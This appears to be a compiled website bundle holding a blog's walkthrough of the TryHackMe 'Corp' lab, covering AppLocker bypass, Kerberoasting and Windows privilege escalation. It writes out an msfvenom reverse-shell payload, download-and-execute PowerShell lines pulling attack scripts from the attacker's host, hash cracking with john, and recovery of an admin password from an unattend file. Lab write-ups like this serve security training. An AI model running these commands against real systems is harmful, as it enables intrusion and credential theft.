"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[48343],{28453:(e,t,r)=>{r.d(t,{R:()=>a,x:()=>c});var n=r(96540);const o={},s=n.createContext(o);function a(e){const t=n.useContext(s);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),n.createElement(s.Provider,{value:t},e.children)}},70077:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>l,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>n,toc:()=>i});const n=JSON.parse('{"id":"hacker/tryhackme/corp","title":"TryHackMe Corp Walkthrough - Corporate Network Penetration Testing","description":"Complete walkthrough of TryHackMe\'s Corp room. Learn corporate network penetration testing, Active Directory attacks, and enterprise security assessment.","source":"@site/docs/hacker/tryhackme/corp.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/corp","permalink":"/docs/hacker/tryhackme/corp","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/corp.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"corporate","permalink":"/docs/tags/corporate"},{"inline":true,"label":"active-directory","permalink":"/docs/tags/active-directory"},{"inline":true,"label":"network-pentest","permalink":"/docs/tags/network-pentest"},{"inline":true,"label":"enterprise","permalink":"/docs/tags/enterprise"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":7,"frontMatter":{"title":"TryHackMe Corp Walkthrough - Corporate Network Penetration Testing","description":"Complete walkthrough of TryHackMe\'s Corp room. Learn corporate network penetration testing, Active Directory attacks, and enterprise security assessment.","keywords":["tryhackme corp","corporate pentest","active directory","network penetration","enterprise security","domain attacks"],"tags":["tryhackme","corporate","active-directory","network-pentest","enterprise"],"sidebar_position":7},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Brainstorm Walkthrough - Windows Buffer Overflow Challenge","permalink":"/docs/hacker/tryhackme/brainstorm"},"next":{"title":"TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide","permalink":"/docs/hacker/tryhackme/attacktive"}}');var o=r(74848),s=r(28453);const a={title:"TryHackMe Corp Walkthrough - Corporate Network Penetration Testing",description:"Complete walkthrough of TryHackMe's Corp room. Learn corporate network penetration testing, Active Directory attacks, and enterprise security assessment.",keywords:["tryhackme corp","corporate pentest","active directory","network penetration","enterprise security","domain attacks"],tags:["tryhackme","corporate","active-directory","network-pentest","enterprise"],sidebar_position:7},c=void 0,l={},i=[{value:"TASK2: BYPASS APPLOCK",id:"task2-bypass-applock",level:2},{value:"shell.exe",id:"shellexe",level:3},{value:"TASK3: KERBEROASTING",id:"task3-kerberoasting",level:2},{value:"enumerate windows",id:"enumerate-windows",level:3},{value:"get kerberoast.ps1",id:"get-kerberoastps1",level:3},{value:"crack hash",id:"crack-hash",level:3},{value:"PRIVESC: user",id:"privesc-user",level:2},{value:"PRIVESC: root",id:"privesc-root",level:2},{value:"PowerUp.ps1",id:"powerupps1",level:3}];function d(e){const t={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsxs)(t.admonition,{title:"Description",type:"info",children:[(0,o.jsxs)(t.p,{children:["These are my notes for the ",(0,o.jsx)(t.a,{href:"https://tryhackme.com/room/corp",children:"Corp Room"})," on TryHackMe."]}),(0,o.jsx)(t.p,{children:"Note: Task #1 is to deploy the machine."}),(0,o.jsxs)(t.table,{children:[(0,o.jsx)(t.thead,{children:(0,o.jsxs)(t.tr,{children:[(0,o.jsx)(t.th,{style:{textAlign:"center"},children:"OS"}),(0,o.jsx)(t.th,{style:{textAlign:"center"},children:"Level"}),(0,o.jsx)(t.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,o.jsx)(t.tbody,{children:(0,o.jsxs)(t.tr,{children:[(0,o.jsx)(t.td,{style:{textAlign:"center"},children:"Windows"}),(0,o.jsx)(t.td,{style:{textAlign:"center"},children:"Easy"}),(0,o.jsx)(t.td,{style:{textAlign:"center"},children:"5/5"})]})})]})]}),"\n",(0,o.jsx)(t.h2,{id:"task2-bypass-applock",children:"TASK2: BYPASS APPLOCK"}),"\n",(0,o.jsx)(t.p,{children:"I RDP to the machine with login details provided. On the machine I can't execute anything with AppLocker tripping and stopping me."}),"\n",(0,o.jsx)(t.h3,{id:"shellexe",children:"shell.exe"}),"\n",(0,o.jsxs)(t.p,{children:["I want to generate a malicious shell and download to an 'allow-listed' directory e.g. ",(0,o.jsx)(t.code,{children:"C:\\Windows\\System32\\spool\\drivers\\color"}),"."]}),"\n",(0,o.jsxs)(t.p,{children:["Generate: ",(0,o.jsx)(t.code,{children:"msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 -e x86/shikata_ga_nai -f exe -o shell.exe"})]}),"\n",(0,o.jsxs)(t.p,{children:["Serve it from my attack machine: ",(0,o.jsx)(t.code,{children:"sudo python3 -m http.server 80"})]}),"\n",(0,o.jsxs)(t.p,{children:["Try pull it down from my RDP session: ",(0,o.jsx)(t.code,{children:"certutil.exe -urlcache -f http://10.11.55.83/shell.exe shell.exe"})," WRONG."]}),"\n",(0,o.jsxs)(t.p,{children:["Try again with PowerShell: ",(0,o.jsx)(t.code,{children:'Invoke-WebRequest -Uri "http://10.11.55.83/shell.exe" -OutFile ".\\shell.exe"'})," CORRECT."]}),"\n",(0,o.jsxs)(t.p,{children:["download to directory: ",(0,o.jsx)(t.code,{children:"C:\\Windows\\System32\\spool\\drivers\\color"})," successful, but running the exe kept tripping AV. need to look into obfuscating binary in some way."]}),"\n",(0,o.jsx)(t.h2,{id:"task3-kerberoasting",children:"TASK3: KERBEROASTING"}),"\n",(0,o.jsx)(t.p,{children:"Follow instructions on how to complete this task."}),"\n",(0,o.jsx)(t.h3,{id:"enumerate-windows",children:"enumerate windows"}),"\n",(0,o.jsx)(t.p,{children:"Looking for existing Service Principals (spn):"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-powershell",children:'PS C:\\Users\\dark> setspn.exe -T medin -Q */*\nLdap Error(0x51 -- Server Down): ldap_connect\nFailed to retrieve DN for domain "medin" : 0x00000051\nWarning: No valid targets specified, reverting to current domain.\nCN=OMEGA,OU=Domain Controllers,DC=corp,DC=local\n        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local\n        ldap/omega.corp.local/ForestDnsZones.corp.local\n        ldap/omega.corp.local/DomainDnsZones.corp.local\n        TERMSRV/OMEGA\n        TERMSRV/omega.corp.local\n        DNS/omega.corp.local\n        GC/omega.corp.local/corp.local\n        RestrictedKrbHost/omega.corp.local\n        RestrictedKrbHost/OMEGA\n        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local\n        HOST/OMEGA/CORP\n        HOST/omega.corp.local/CORP\n        HOST/OMEGA\n        HOST/omega.corp.local\n        HOST/omega.corp.local/corp.local\n        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local\n        ldap/OMEGA/CORP\n        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local\n        ldap/omega.corp.local/CORP\n        ldap/OMEGA\n        ldap/omega.corp.local\n        ldap/omega.corp.local/corp.local\nCN=krbtgt,CN=Users,DC=corp,DC=local\n        kadmin/changepw\nCN=fela,CN=Users,DC=corp,DC=local\n        HTTP/fela\n        HOST/fela@corp.local\n        HTTP/fela@corp.local\n\nExisting SPN found!\n'})}),"\n",(0,o.jsx)(t.h3,{id:"get-kerberoastps1",children:"get kerberoast.ps1"}),"\n",(0,o.jsx)(t.p,{children:"no external network, served the kerberoast ps1 from my local webserver:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-powershell",children:"PS C:\\Users\\dark> iex(New-Object Net.WebClient).DownloadString('http://10.11.55.83/Invoke-Kerberoast.ps1')\nPS C:\\Users\\dark> Invoke-Kerberoast -OutputFormat hashcat|fl\n\n\nTicketByteHexStream  :\nHash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$1F4596FE1600B29B2C9C9372905C3DAA$55AD748236930A037C\n                       D75C0720E2B5416A7A48FD40189B621C110C19DC51AA947718EFE907583823B8FF220F32E1277F3FEB01DE738E8\n                       5DC1F15ACEDAAC6C0B30C66936464C1F0B20388F539EDCDA68FE4A588383BC8A4E139C491EE5B5ACF4481954D86\n                       86DDF9C4E685628AAFAA95BCFE5E3FE2E8C1CCECE32071EBB07997C0B5C6B8814EBF973C9486680FA944F98F6A2\n                       46D50205A9BB026D43CC326D053346767F54DC4FF4F822548F0FF0BA58D58A3BA14ABF05A004B4E50D42F68664A\n                       E4EAC6660FADAA4B87A61A227CC956CBCF6E7FEA4AFFFFD6374AC20614177BF09C54F2EEE0CA2615FA4FA941430\n                       1D251AB5616774D07FEF1E3F4337D9AB58A33861A7B95120E0BDD537D5CA2E1427CB4075FDE81AAC3FF502AA8C1\n                       9CB629C69211D19193A498F36DDD8EF1630A95E22E35B6A72E1482B5A4231F3A6B335A6F88954FBE5E3BD25287D\n                       B91AF143BB91C6A5538776CAF5E339C8CB045E4927F7395D606FC90DFD60ABAF04FA39D42D684FC9E70A521CA50\n                       272C43CA51E2C7C85C470BEA4509F4EAA84467F9878B96D1CA32550E635175C0E5129669F8F80264D451A83D9E8\n                       6E6A1FBD6E5B0436C20D43B5187F80A626EEF84D0477AFBA4729F0342601CFCE3FA891229959D8EFF0A48ABB782\n                       146105769CFEF0C19A60DB10943323D11BED7CFD65C56B2D2CB5CDC5D0B13580469F0664188427C86D5F758A53B\n                       7041DD9678439695545A5A19497FDF82E02F51427D1E1AC2BD9AA23CF87F45925BE17707244D3920D7F144199D0\n                       DCD58968D5B07FBE9753109AC735442A85111D1DC8246A86E68E5F18DBB18511C9842EB9CBD0E0E74380DA176BF\n                       68A1235AD6FD99CAAB44184709339845D2FE3AA2A1ADC0A5FD27374DA33CF19A674AF740368A4862295414FF2A6\n                       DAEE9B2E17E911374292A8D08A42A5D83DE63C7B9026C83BC8A47DAE2F46BAC78B86051565C8BF078ED8E73C8DB\n                       CA22C382CF4633DD0C9573EF300CC836377FADB488936B2DD07922D544EE85FA50BA0514F72EE7288FC4A028035\n                       ABD9E255D424B4B7A80DCCA27846C2EDE8957EA025F49A1D9367B9309D4516B30694C34E10EEC694795FE1D3BC3\n                       E0D86332124ED33F9A3084F25B3BA2DD59AEB585FC94BE95A7AABF7165377EA92AEDF441E6C2D29E2F2501DFA0B\n                       255AA76A3869D8262D0A6D7F3C6BDD17BC83AB5EC85D9DB71D58B00EC8F7F4E001C9C856F812ADD9ED42905A03B\n                       17ED2ACB153D7B2D334C05BFBC68AFC0ECEFA97864F4B060D612B3FE436FA6B3DE682DF0E2788AAB4F57DF35D08\n                       4CDB2290DB60B8F4C30717084A6125BC79538B128DF1F73603F40448F4934AF27D3711682B5516EB2902A86E639\n                       45BC7FD6D75A10558E7A419AA006C1DCC9AB195E757F521513299C3B2\nSamAccountName       : fela\nDistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local\nServicePrincipalName : HTTP/fela\n"})}),"\n",(0,o.jsx)(t.h3,{id:"crack-hash",children:"crack hash"}),"\n",(0,o.jsxs)(t.p,{children:["copied the hash to a text file ",(0,o.jsx)(t.code,{children:"hash.txt"})," and then used ",(0,o.jsx)(t.code,{children:'cat hash.txt | tr -d "[:space:]" > hash.file'})," to remove all whitespaces and join the hash up."]}),"\n",(0,o.jsx)(t.p,{children:"then used john (thanks tedd) to crack:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"\u279c  CORP git:(main) \u2717 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrubenF124        (?)\n1g 0:00:00:07 DONE (2022-03-31 22:36) 0.1340g/s 554003p/s 554003c/s 554003C/s rubens02..ruben4484\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n"})}),"\n",(0,o.jsx)(t.p,{children:"show"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"\u279c  CORP git:(main) \u2717 john --show hash.txt\n?:rubenF124\n\n1 password hash cracked, 0 left\n"})}),"\n",(0,o.jsx)(t.h2,{id:"privesc-user",children:"PRIVESC: user"}),"\n",(0,o.jsxs)(t.p,{children:["RDP logged in as ",(0,o.jsx)(t.code,{children:"fela"})," and got flag from desktop."]}),"\n",(0,o.jsx)(t.h2,{id:"privesc-root",children:"PRIVESC: root"}),"\n",(0,o.jsxs)(t.p,{children:["Web served the ",(0,o.jsx)(t.code,{children:"PowerUp.ps1"})," script from my attack machine: ",(0,o.jsx)(t.code,{children:"iex\u200b(New-Object Net.WebClient).DownloadString('http://http://10.11.55.83/download/PowerUp.ps1')"})]}),"\n",(0,o.jsx)(t.h3,{id:"powerupps1",children:"PowerUp.ps1"}),"\n",(0,o.jsx)(t.p,{children:"Found a hash value:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-powershell",children:"PS C:\\Users\\fela.CORP> iex(New-Object Net.WebClient).DownloadString('http://10.11.55.83/download/PowerUp.ps1')\nPS C:\\Users\\fela.CORP> type C:\\Windows\\Panther\\Unattend\\Unattended.xml\n<AutoLogon />\n    <Password />\n        <Value />dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>\n        <PlainText />false</PlainText>\n    </Password>\n    <Enabled />true</Enabled>\n    <Username />Administrator</Username>\n</AutoLogon>\n"})}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=\ncertutil.exe -decode "C:\\path\\to\\b64.txt" decode.txt`\n\n$echo dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 -d\ntqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T\n'})}),"\n",(0,o.jsxs)(t.p,{children:["Use ",(0,o.jsx)(t.code,{children:"tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T"})," admin password with ",(0,o.jsx)(t.code,{children:"evil-winrm"})," login as Admin, grab flag from ",(0,o.jsx)(t.code,{children:"C:\\Users\\Administrator\\Desktop"})]})]})}function h(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}}}]);